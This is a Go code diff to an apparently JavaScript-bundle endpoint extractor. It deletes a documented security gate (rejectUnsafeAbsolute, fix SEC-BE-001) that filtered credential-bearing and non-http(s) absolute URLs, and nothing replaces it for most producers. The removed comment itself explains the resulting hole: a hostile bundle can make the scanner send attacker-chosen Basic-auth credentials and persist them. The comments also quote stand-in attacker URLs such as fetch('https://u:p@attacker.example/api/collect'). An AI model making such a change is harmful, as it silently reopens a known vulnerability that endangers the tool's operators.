@@ -659,82 +659,10 @@ func ExtractFromBundle(jsSource []byte, baseURL string) ([]ExtractedEndpoint, er
 	//    numeric segments into named params downstream.
 	endpoints = append(endpoints, extractConcatEndpoints(jsSource, baseURL, baseHost, seen, astURLs)...)
 
-	// SEC-BE-001 (second pass): apply the parse-time URL gate to EVERY absolute
-	// URL this function emits, from all five producers above, not just the concat
-	// reconstructions of step 5. This is the single choke point, so a new producer
-	// added later inherits the gate automatically.
-	endpoints = rejectUnsafeAbsolute(endpoints)
-
 	if len(endpoints) == 0 {
 		return nil, nil
 	}
 	return endpoints, nil
-}
-
-// rejectUnsafeAbsolute drops every endpoint whose absolute URL fails
-// crawl.ValidateFullURL — embedded credentials, a non-http(s) scheme, or an empty
-// host. Relative URLs are returned untouched (they are same-origin by
-// construction and carry no userinfo).
-//
-// Why this must cover all producers, not just concat (SEC-BE-001, second pass):
-// classify Rule 7 (staticJSFloor) floors EVERY crawl.IsJSStaticSource candidate
-// whose path carries an API indicator to the default --confidence, and that
-// includes the AST-walker output of steps 1, 3 and 4 — which had no credential
-// gate of their own. The first pass gated only step 5. Traced end to end: the
-// bundle literal `fetch("https://u:p@attacker.example/api/collect")` is emitted
-// verbatim by jsluiceURLToEndpoint (its only filters are filterURL and
-// isExprOnly), preserved as absolute by resolveURL (ref.IsAbs()), and classifies
-// at exactly StaticJSConfidence with reason "path-heuristic+static-js-candidate",
-// clearing RunClassifiers' `>= threshold`. OptionsProbe.probeURL then builds the
-// request straight from that URL — ssrf.ValidateURL screens only scheme and
-// resolved IP, never u.User — and because probe.Config.AuthHeaders is populated
-// by no non-test caller, net/http derives `Authorization: Basic
-// <base64(userinfo)>` from req.URL.User on every probe. A scanned site could
-// therefore make Vespasian issue authenticated requests with attacker-chosen
-// credentials on the operator's behalf, and persist that credential into
-// capture.json and the generated spec. Rule 7 is new in LAB-4992, so this was
-// newly reachable: before it, such a candidate scored 0.15 and was dropped at the
-// default threshold.
-//
-// Deliberately NOT applied here: the host/scheme equality check that
-// extractConcatEndpoints applies. That stricter gate stays concat-only because
-// the two candidate classes differ in kind. A concat reconstruction is a
-// speculative recombination of bundle literals, so a cross-origin result is far
-// more likely to be an artifact (or a plant) than a real endpoint. An AST literal
-// is a real call site the bundle actually invokes, and a SPA calling
-// `https://api.example.com` from `https://app.example.com` is routine — dropping
-// those would be a significant recall regression for the tool's primary use case.
-// TestExtractFromBundle_CrossOriginASTLiteralRetained pins that asymmetry so a
-// future "make the gates symmetric" change cannot silently gut recall.
-//
-// Residual, accepted: a hostile bundle can still list a clean (credential-free)
-// cross-origin API URL and have it probed, disclosing the operator's egress IP
-// and scan timing to attacker-designated infrastructure. That is inherent to
-// honoring bundle-declared API hosts at all — the crawler already observes and
-// probes cross-origin dynamic requests — and ssrf.ValidateURL still blocks
-// private/loopback/link-local destinations. Closing it would require an
-// origin allowlist at the probe sink, which would change behavior for every
-// source, not just JS-static ones.
-func rejectUnsafeAbsolute(endpoints []ExtractedEndpoint) []ExtractedEndpoint {
-	filtered := endpoints[:0]
-	for _, ep := range endpoints {
-		if isAbsoluteURL(ep.URL) {
-			if _, ok := crawl.ValidateFullURL(ep.URL); !ok {
-				continue
-			}
-		}
-		filtered = append(filtered, ep)
-	}
-	return filtered
-}
-
-// isAbsoluteURL reports whether raw carries an http(s) scheme. Case-insensitive:
-// url.Parse lower-cases the scheme, so a bundle literal spelled "HTTPS://host/x"
-// is absolute to every downstream consumer and must be recognized as such here
-// (a case-sensitive HasPrefix would route it down the relative branch instead).
-func isAbsoluteURL(raw string) bool {
-	lower := strings.ToLower(raw)
-	return strings.HasPrefix(lower, "http://") || strings.HasPrefix(lower, "https://")
 }
 
 // extractConcatEndpoints reconstructs concat / +-chain / service-prefix API
@@ -777,12 +705,12 @@ func extractConcatEndpoints(jsSource []byte, baseURL, baseHost string, seen map[
 		// Relative reconstructions arrive without a leading slash (e.g.
 		// "identity/api/auth/login"); normalize so they resolve as
 		// document-root paths rather than bundle-relative ones.
-		// Shared with rejectUnsafeAbsolute, and case-insensitive: a bundle literal
-		// spelled "HTTPS://attacker.example/api/" is absolute to url.Parse (which
-		// lower-cases the scheme), so a case-sensitive check would route it down
-		// the relative branch, prepend a slash, and emit it as path noise rather
-		// than gating it.
-		absolute := isAbsoluteURL(p)
+		// Shared with pkg/crawl's own scheme checks, and case-insensitive: a bundle
+		// literal spelled "HTTPS://attacker.example/api/" is absolute to url.Parse
+		// (which lower-cases the scheme), so a case-sensitive check would route it
+		// down the relative branch, prepend a slash, and emit it as path noise
+		// rather than gating it (QUAL-003).
+		absolute := crawl.IsAbsoluteHTTPURL(p)
 		if !absolute && !strings.HasPrefix(p, "/") {
 			p = "/" + p
 		}
